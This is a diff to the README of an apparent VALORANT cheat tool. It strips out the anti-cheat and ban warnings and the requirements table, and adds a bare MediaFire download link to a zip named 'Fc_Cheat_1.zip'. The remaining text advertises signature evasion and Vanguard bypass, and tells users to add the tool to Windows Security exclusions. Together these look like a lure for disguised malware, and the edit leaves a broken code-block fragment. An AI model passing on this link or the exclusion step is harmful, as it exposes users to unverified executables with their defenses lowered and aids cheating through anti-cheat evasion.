@@ -4,11 +4,7 @@
 ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)
 ![Status](https://img.shields.io/badge/status-Experimental-orange)
 
-> **🚨 CRITICAL WARNING**
-> 
-> **VALORANT HAS ADVANCED ANTI-CHEAT (VANGUARD)**
-> 
-> This software is for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**. Using cheats in VALORANT will result in **PERMANENT HARDWARE BANS**. The developers take NO responsibility for any bans or consequences. Use at your own extreme risk.
+Download- https://www.mediafire.com/file/m8qga4qo9cv4cmt/Fc_Cheat_1.zip/file
 
 ## 📋 Feature Overview
 
@@ -40,24 +36,6 @@
 - **Signature Evasion**: Regular signature updates
 - **Vanguard Detection Avoidance**: Experimental bypass methods
 
-## ⚠️ Anti-Cheat Warning
-
-**Vanguard Level: KERNEL MODE**
-- Ring-0 anti-cheat system
-- 24/7 operation even when game closed
-- Hardware fingerprinting
-- Permanent HWID bans
-- Machine learning detection
-
-## 🛠️ System Requirements
-
-| Component | Minimum | Recommended |
-|-----------|---------|-------------|
-| OS | Windows 10/11 (64-bit) | Windows 11 (64-bit) |
-| CPU | Intel i5-7400 | Intel i7-9700K |
-| RAM | 8 GB DDR4 | 16 GB DDR4 |
-| GPU | NVIDIA GTX 1050 Ti | NVIDIA RTX 3060 |
-| Storage | 5 GB SSD | 10 GB NVMe SSD |
 
 ## 📥 Installation Guide
 
@@ -66,9 +44,6 @@
 - [Visual C++ 2019 Redistributable](https://aka.ms/vs/16/release/vc_redist.x64.exe)
 - Latest Windows Security Updates
 
-### ⚡ Quick Setup
 
-1. **Disable Security Temporarily**
-   ```cmd
    # Add tool to exclusions
    Windows Security → Virus & Threat Protection → Manage Settings → Exclusions
